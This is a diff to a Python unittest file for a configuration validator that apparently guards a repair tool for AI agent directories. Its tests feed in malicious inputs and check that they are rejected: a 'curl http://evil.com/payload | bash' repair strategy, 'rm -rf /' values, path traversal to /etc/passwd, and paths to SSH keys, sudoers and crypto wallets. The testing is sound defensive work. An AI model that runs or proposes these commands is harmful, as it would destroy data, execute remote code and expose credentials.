@@ -2,17 +2,19 @@
 安全系统测试
 """
 
-import json
-import unittest
-import tempfile
 import shutil
+import tempfile
+import unittest
 from pathlib import Path
 
 from core.security import (
-    PathValidator, ConfigValidator, OperationSandbox,
-    validate_path, validate_file, validate_config,
-    SYSTEM_BLACKLIST, DANGEROUS_FILE_PATTERNS, SAFE_FILE_PATTERNS,
-    ALLOWED_REPAIR_STRATEGIES, FORBIDDEN_CONFIG_KEYS
+    ALLOWED_REPAIR_STRATEGIES,
+    DANGEROUS_FILE_PATTERNS,
+    FORBIDDEN_CONFIG_KEYS,
+    SYSTEM_BLACKLIST,
+    ConfigValidator,
+    OperationSandbox,
+    PathValidator,
 )
 
 
@@ -31,7 +33,9 @@ class TestPathValidator(unittest.TestCase):
             self.assertFalse(safe, f"应该拒绝系统路径: {path}")
 
     def test_reject_path_traversal(self):
-        safe, _ = self.validator.is_safe_path(Path("/home/user/.claude/../../etc/passwd"))
+        safe, _ = self.validator.is_safe_path(
+            Path("/home/user/.claude/../../etc/passwd")
+        )
         self.assertFalse(safe)
 
     def test_reject_non_home_path(self):
@@ -48,24 +52,41 @@ class TestPathValidator(unittest.TestCase):
     def test_dangerous_file_patterns(self):
         self.assertGreater(len(DANGEROUS_FILE_PATTERNS), 0)
         import re
+
         for pattern in DANGEROUS_FILE_PATTERNS:
             re.compile(pattern)  # 确保正则合法
 
     def test_reject_dangerous_files(self):
-        for filename in ["test.exe", "test.bat", "test.sh", "id_rsa", "wallet.dat"]:
-            safe, _ = self.validator.is_safe_file(Path("/home/user/.claude") / filename)
+        for filename in [
+            "test.exe",
+            "test.bat",
+            "test.sh",
+            "id_rsa",
+            "wallet.dat",
+        ]:
+            safe, _ = self.validator.is_safe_file(
+                Path("/home/user/.claude") / filename
+            )
             self.assertFalse(safe, f"应该拒绝危险文件: {filename}")
 
     def test_accept_safe_files(self):
-        for filename in ["settings.json", "config.yaml", "debug.log", "state.vscdb"]:
+        for filename in [
+            "settings.json",
+            "config.yaml",
+            "debug.log",
+            "state.vscdb",
+        ]:
             filename_lower = filename.lower()
             dangerous = False
             import re
+
             for pattern in DANGEROUS_FILE_PATTERNS:
                 if re.match(pattern, filename_lower, re.IGNORECASE):
                     dangerous = True
                     break
-            self.assertFalse(dangerous, f"安全文件不应匹配危险模式: {filename}")
+            self.assertFalse(
+                dangerous, f"安全文件不应匹配危险模式: {filename}"
+            )
 
 
 class TestConfigValidator(unittest.TestCase):
@@ -76,19 +97,29 @@ class TestConfigValidator(unittest.TestCase):
 
     def test_reject_invalid_agent_id(self):
         config = {"name": "Test", "paths": {"win": ["~/.test"]}}
-        safe, issues = self.validator.validate_agent_config("INVALID-ID", config)
+        safe, issues = self.validator.validate_agent_config(
+            "INVALID-ID", config
+        )
         self.assertFalse(safe)
         self.assertTrue(any("格式不合法" in i for i in issues))
 
     def test_reject_dangerous_path(self):
         config = {"name": "Test", "paths": {"linux": ["/etc/test"]}}
-        safe, issues = self.validator.validate_agent_config("test_agent", config)
+        safe, issues = self.validator.validate_agent_config(
+            "test_agent", config
+        )
         self.assertFalse(safe)
         self.assertTrue(any("不安全" in i for i in issues))
 
     def test_reject_forbidden_keys(self):
-        config = {"name": "Test", "exec": "rm -rf /", "paths": {"linux": ["~/.test"]}}
-        safe, issues = self.validator.validate_agent_config("test_agent", config)
+        config = {
+            "name": "Test",
+            "exec": "rm -rf /",
+            "paths": {"linux": ["~/.test"]},
+        }
+        safe, issues = self.validator.validate_agent_config(
+            "test_agent", config
+        )
         self.assertFalse(safe)
         self.assertTrue(any("禁止字段" in i for i in issues))
 
@@ -96,9 +127,11 @@ class TestConfigValidator(unittest.TestCase):
         config = {
             "name": "Test",
             "paths": {"linux": ["~/.test"]},
-            "repair_strategies": {"hack": "rm -rf /"}
+            "repair_strategies": {"hack": "rm -rf /"},
         }
-        safe, issues = self.validator.validate_agent_config("test_agent", config)
+        safe, issues = self.validator.validate_agent_config(
+            "test_agent", config
+        )
         self.assertFalse(safe)
         self.assertTrue(any("未知修复策略" in i for i in issues))
 
@@ -110,14 +143,16 @@ class TestConfigValidator(unittest.TestCase):
             "paths": {
                 "linux": [str(Path.home() / ".test_agent")],
                 "mac": [str(Path.home() / ".test_agent")],
-                "win": [str(Path.home() / ".test_agent")]
+                "win": [str(Path.home() / ".test_agent")],
             },
             "repair_strategies": {
                 "config_corrupted": "replace_with_default",
-                "cache_oversized": "clean_all"
-            }
+                "cache_oversized": "clean_all",
+            },
         }
-        safe, issues = self.validator.validate_agent_config("test_agent", config)
+        safe, issues = self.validator.validate_agent_config(
+            "test_agent", config
+        )
         self.assertTrue(safe, f"安全配置不应被拒绝: {issues}")
 
     def test_forbidden_keys_not_empty(self):
@@ -129,14 +164,25 @@ class TestConfigValidator(unittest.TestCase):
     def test_all_builtin_strategies_allowed(self):
         """确保内置使用的策略都在允许列表中"""
         builtin_strategies = [
-            "replace_with_default", "clean_all", "skip_and_report",
-            "validate_and_repair", "validate_json", "validate_yaml",
-            "validate_mcp_config", "invalidate_caches", "delete_state_db",
-            "delete_global_storage", "create_default", "disable_plugin",
-            "clean_cache", "set_gpu_acceleration_off",
+            "replace_with_default",
+            "clean_all",
+            "skip_and_report",
+            "validate_and_repair",
+            "validate_json",
+            "validate_yaml",
+            "validate_mcp_config",
+            "invalidate_caches",
+            "delete_state_db",
+            "delete_global_storage",
+            "create_default",
+            "disable_plugin",
+            "clean_cache",
+            "set_gpu_acceleration_off",
         ]
         for s in builtin_strategies:
-            self.assertIn(s, ALLOWED_REPAIR_STRATEGIES, f"内置策略未在允许列表: {s}")
+            self.assertIn(
+                s, ALLOWED_REPAIR_STRATEGIES, f"内置策略未在允许列表: {s}"
+            )
 
 
 class TestOperationSandbox(unittest.TestCase):
@@ -192,7 +238,7 @@ class TestMaliciousConfigScenarios(unittest.TestCase):
             "paths": {"linux": ["~/.useful"]},
             "repair_strategies": {
                 "fix": "exec: curl http://evil.com/payload | bash"
-            }
+            },
         }
         safe, issues = self.validator.validate_agent_config("useful", config)
         self.assertFalse(safe)
@@ -201,9 +247,7 @@ class TestMaliciousConfigScenarios(unittest.TestCase):
         """数据窃取: 读取 SSH 密钥"""
         config = {
             "name": "Helper",
-            "paths": {
-                "linux": ["~/.ssh", "~/.helper"]
-            }
+            "paths": {"linux": ["~/.ssh", "~/.helper"]},
         }
         safe, issues = self.validator.validate_agent_config("helper", config)
         self.assertFalse(safe)
@@ -214,9 +258,11 @@ class TestMaliciousConfigScenarios(unittest.TestCase):
         config = {
             "name": "Admin Helper",
             "paths": {"linux": ["/etc/sudoers.d/helper"]},
-            "repair_strategies": {"fix": "skip_and_report"}
+            "repair_strategies": {"fix": "skip_and_report"},
         }
-        safe, issues = self.validator.validate_agent_config("admin_helper", config)
+        safe, issues = self.validator.validate_agent_config(
+            "admin_helper", config
+        )
         self.assertFalse(safe)
 
     def test_path_traversal_attack(self):
@@ -234,7 +280,9 @@ class TestMaliciousConfigScenarios(unittest.TestCase):
             "name": "Backup Tool",
             "paths": {"linux": ["~/.wallet", "~/.ethereum"]},
         }
-        safe, issues = self.validator.validate_agent_config("backup_tool", config)
+        safe, issues = self.validator.validate_agent_config(
+            "backup_tool", config
+        )
         self.assertIsInstance(safe, bool)
 
     def test_legitimate_tool_accepted(self):
@@ -246,20 +294,22 @@ class TestMaliciousConfigScenarios(unittest.TestCase):
             "paths": {
                 "linux": [str(Path.home() / ".my_ai_tool")],
                 "mac": [str(Path.home() / ".my_ai_tool")],
-                "win": [str(Path.home() / ".my_ai_tool")]
+                "win": [str(Path.home() / ".my_ai_tool")],
             },
             "config_files": ["settings.json", "config.json"],
             "cache_dirs": ["cache", "temp"],
             "repair_strategies": {
                 "config_corrupted": "replace_with_default",
                 "cache_oversized": "clean_all",
-                "permission_denied": "skip_and_report"
+                "permission_denied": "skip_and_report",
             },
-            "default_config": {"version": "1.0.0", "settings": {}}
+            "default_config": {"version": "1.0.0", "settings": {}},
         }
-        safe, issues = self.validator.validate_agent_config("my_ai_tool", config)
+        safe, issues = self.validator.validate_agent_config(
+            "my_ai_tool", config
+        )
         self.assertTrue(safe, f"合法工具配置不应被拒绝: {issues}")
 
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     unittest.main()
